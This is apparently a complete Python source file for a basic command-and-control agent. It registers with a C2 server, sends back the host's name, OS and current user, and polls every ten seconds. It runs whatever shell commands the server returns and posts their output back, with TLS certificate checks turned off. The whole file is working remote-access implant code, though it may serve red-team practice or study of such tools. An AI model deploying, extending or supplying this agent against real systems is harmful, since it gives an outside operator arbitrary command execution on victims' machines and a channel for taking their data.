import requests
import time
import subprocess
import json
import platform
import uuid # To generate a unique ID if C2 doesn't assign one first, or for other purposes
import os # Added for get_system_info

# Configuration - Adjust these as needed
C2_URL = "https://localhost:8443" # Default C2 URL (ensure port matches listener)
VERIFY_SSL = False # For self-signed certs; set to True or path to CA bundle in production
BEACON_INTERVAL = 10 # Seconds
AGENT_ID = None # Will be assigned by C2 upon registration

# Suppress InsecureRequestWarning if VERIFY_SSL is False
if not VERIFY_SSL:
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def get_system_info():
    return {
        "hostname": platform.node(),
        "os": platform.system(),
        "os_version": platform.release(),
        "architecture": platform.machine(),
        "user": os.getenv('USER') or os.getenv('USERNAME') # Get current user
    }

def register_agent():
    global AGENT_ID
    try:
        payload = {
            # "action": "register", # C2 server infers action from path
            "initial_data": get_system_info()
        }
        print(f"Attempting to register with C2: {C2_URL}/register")
        response = requests.post(f"{C2_URL}/register", json=payload, verify=VERIFY_SSL, timeout=10)
        response.raise_for_status() # Raise an exception for HTTP errors
        data = response.json()
        if data.get("agent_id"):
            AGENT_ID = data["agent_id"]
            print(f"Agent registered successfully. AGENT_ID: {AGENT_ID}")
            return True
        else:
            print(f"Failed to get agent_id from registration response: {data}")
            return False
    except requests.exceptions.RequestException as e:
        print(f"Registration failed: {e}")
        return False
    except json.JSONDecodeError as e:
        print(f"Error decoding registration JSON response: {e} - Response was: {response.text}")
        return False


def send_beacon():
    if not AGENT_ID:
        print("Agent not registered. Cannot send beacon.")
        return None
    try:
        payload = {"agent_id": AGENT_ID}
        # print(f"Sending beacon for agent {AGENT_ID} to {C2_URL}/beacon")
        response = requests.post(f"{C2_URL}/beacon", json=payload, verify=VERIFY_SSL, timeout=10)
        response.raise_for_status()
        
        try:
            data = response.json()
            # Check if the response contains a command and that command is not None/empty
            if data.get("command"): # C2 sends {"command": "the_command", "id": "cmd_id"} or {"status":"ok"}
                return data 
            # If no command, it might be a simple status_ok or similar, which is fine.
            # print(f"Beacon response (JSON): {data}")
            return None # No actionable command
        except json.JSONDecodeError:
            if response.text and response.text.strip():
                 print(f"Beacon response (non-JSON): {response.text.strip()}")
            return None # No command if not valid JSON with command structure

    except requests.exceptions.RequestException as e:
        print(f"Beacon failed: {e}")
        return None

def execute_command(command_details: dict):
    if not AGENT_ID:
        print("Agent not registered. Cannot execute command.")
        return

    command = command_details.get("command")
    command_id = command_details.get("id") # Changed from command_id to id to match C2 plugin

    if not command:
        print("No command string found in command details.")
        # Potentially send back an error or empty result for this command_id
        send_command_output(command_id, command or "[No command provided]", "[ERROR] Agent received no command string.")
        return

    print(f"Executing command_id '{command_id}': {command}")
    output_str = ""
    try:
        if platform.system() == "Windows":
            proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, errors='replace')
        else:
            proc = subprocess.Popen(command.split(), stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, errors='replace')
        
        stdout, stderr = proc.communicate(timeout=30) 
        
        if stdout:
            output_str += stdout
        if stderr:
            output_str += f"\n[ERROR]\n{stderr}"
        
        if proc.returncode != 0 and not output_str: 
            output_str = f"[No output] Command exited with return code: {proc.returncode}"
        elif not output_str: 
             output_str = "[No output]"

    except subprocess.TimeoutExpired:
        output_str = "[ERROR] Command execution timed out."
        print(output_str)
    except FileNotFoundError:
        output_str = f"[ERROR] Command not found: {command.split()[0] if command else 'N/A'}"
        print(output_str)
    except Exception as e:
        output_str = f"[ERROR] Command execution failed: {e}"
        print(output_str)

    send_command_output(command_id, command, output_str)

def send_command_output(command_id, command_sent, output):
    if not AGENT_ID:
        print("Agent not registered. Cannot send command output.")
        return
    try:
        payload = {
            "agent_id": AGENT_ID,
            "command_id": command_id, 
            # "command_sent": command_sent, # C2 already knows the command via command_id
            "output": output
        }
        # print(f"Sending output for command_id '{command_id}'...")
        response = requests.post(f"{C2_URL}/cmd_output", json=payload, verify=VERIFY_SSL, timeout=10)
        response.raise_for_status()
        # print(f"Output for command_id '{command_id}' sent successfully.")
    except requests.exceptions.RequestException as e:
        print(f"Failed to send command output for command_id '{command_id}': {e}")

if __name__ == "__main__":
    print("Starting basic C2 agent...")
    if not register_agent():
        print("Agent registration failed. Exiting.")
        # Allow multiple registration attempts with a delay
        retry_count = 0
        max_retries = 3
        while retry_count < max_retries:
            print(f"Retrying registration in {BEACON_INTERVAL} seconds... (Attempt {retry_count+1}/{max_retries})")
            time.sleep(BEACON_INTERVAL)
            if register_agent():
                break
            retry_count += 1
        if not AGENT_ID:
            print("Agent registration failed after multiple attempts. Exiting.")
            exit(1)


    print(f"Agent started. Beaconing every {BEACON_INTERVAL} seconds to {C2_URL}")
    try:
        while True:
            beacon_response = send_beacon() # beacon_response is a dict e.g. {"command": "whoami", "id": "cmd_uuid"} or None
            if beacon_response and isinstance(beacon_response, dict) and beacon_response.get("command"):
                execute_command(beacon_response) 
            # elif beacon_response: # If response is not None but not a command dict (e.g. status ok)
                # print(f"Received non-command beacon response: {beacon_response}") # Too verbose for normal operation

            time.sleep(BEACON_INTERVAL)
    except KeyboardInterrupt:
        print("\nAgent shutting down.")
    except Exception as e:
        print(f"An unexpected error occurred in the main loop: {e}")
```
